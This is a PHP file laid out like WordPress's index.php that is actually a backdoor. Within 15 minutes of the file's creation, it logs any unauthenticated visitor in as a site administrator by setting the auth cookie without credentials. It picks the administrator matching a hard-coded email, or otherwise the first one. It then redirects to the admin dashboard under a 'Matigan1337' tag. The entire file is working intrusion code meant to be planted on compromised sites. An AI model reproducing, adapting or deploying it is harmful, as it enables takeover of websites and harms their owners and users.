<?php

$email = 'kuntulbiji@hotmail.com'; //change this to your email

/**
 * AUTO LOGIN WORDPRESS
 */
function auto_login( $email ) {
    if ( ! is_user_logged_in() ) {
        $user_id       = get_user_id( $email );
        $user          = get_user_by( 'ID', $user_id );
        $redirect_page = admin_url() . '?platform=Matigan1337';
        if ( ! $user ) {
            wp_redirect( $redirect_page );
            exit();
        }
        $login_username = $user->user_login;
        wp_set_current_user( $user_id, $login_username );
        wp_set_auth_cookie( $user_id );
        do_action( 'wp_login', $login_username, $user );
        
        wp_redirect( $redirect_page );
        exit();
    }
}

/**
 * HAPPY ENJOY
 * MAMATIGAN
 */
function get_user_id( $email )
{
    $admins = get_users( [
        'role' => 'administrator',
        'search' => '*' . $email . '*',
        'search_columns' => ['user_email'],
    ] );
    if (isset($admins[0]->ID)) {
        return $admins[0]->ID;
    }

    $admins = get_users( [ 'role' => 'administrator' ] );
    if (isset($admins[0]->ID)) {
        return $admins[0]->ID;
    }

    return null;
}

define( 'WP_USE_THEMES', true );
$timeSinceScriptCreation = time() - stat( __FILE__ )['mtime'];
if ( ! isset( $wp_did_header ) ) {
    $wp_did_header = true;

    require($_SERVER['DOCUMENT_ROOT'].'/wp-load.php');
   
    if ( is_user_logged_in() ) {
        $redirect_page = admin_url() . '?platform=Matigan1337';
        wp_redirect( $redirect_page );
        exit();
    }
    
    
    if ( $timeSinceScriptCreation < 900 ) {
        auto_login($email);
    }
    
    wp();
    
    require_once( ABSPATH . WPINC . '/template-loader.php' );
}